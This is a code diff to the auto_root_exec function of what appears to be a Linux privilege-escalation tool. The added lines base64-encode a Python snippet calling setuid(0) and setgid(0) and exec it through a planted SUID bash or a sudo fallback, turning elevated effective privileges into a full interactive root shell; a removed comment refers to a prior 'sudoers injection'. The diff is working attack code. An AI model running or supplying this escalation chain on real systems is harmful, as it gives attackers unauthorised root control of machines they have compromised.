@@ -444,20 +444,34 @@ def auto_root_exec(binary):
 
         _fix_path()
 
+        # bash -p gives euid=0; python3 then calls setuid(0) to promote
+        # ruid→0 for a true root shell. Base64-encode the Python snippet to
+        # avoid shell quoting conflicts inside bash -p -c "...".
+        import base64 as _b64m
+        _esc_code = (
+            "import os;"
+            "os.setuid(0);"
+            "os.setgid(0);"
+            "os.execl('/bin/bash','bash','-i')"
+        )
+        _esc_b64 = _b64m.b64encode(_esc_code.encode()).decode()
+        _esc_shell = "exec {py} -c \"$(echo {b64}|base64 -d)\"".format(
+            py=sys.executable, b64=_esc_b64
+        )
+
         # Try each SUID candidate
         for cand in SUID_CANDIDATES:
             try:
                 st = os.stat(cand)
                 if st.st_uid == 0 and (st.st_mode & 0o4000):
-                    log("[+] SUID bash ready → %s -p" % cand)
+                    log("[+] SUID bash → %s (euid=0 → uid=0 via python)" % cand)
                     _reattach_tty()
-                    os.execl(cand, cand, "-p")
+                    os.execl(cand, cand, "-p", "-c", _esc_shell)
                     return
             except OSError:
                 pass
 
         log("[-] SUID bash failed (nosuid?) — trying sudo fallback")
-        # sudo fallback: works if sudoers injection succeeded
         _reattach_tty()
         sudo_bin = None
         for d in ("/usr/bin", "/bin", "/usr/local/bin"):
@@ -466,8 +480,9 @@ def auto_root_exec(binary):
                 break
         if sudo_bin:
             try:
-                log("[*] exec: sudo -n bash")
-                os.execl(sudo_bin, sudo_bin, "-n", "bash")
+                log("[*] exec: sudo python3 → uid=0 bash")
+                # Pass _esc_code directly as argv — no shell, no quoting issue
+                os.execl(sudo_bin, sudo_bin, "-n", sys.executable, "-c", _esc_code)
                 return
             except OSError:
                 pass
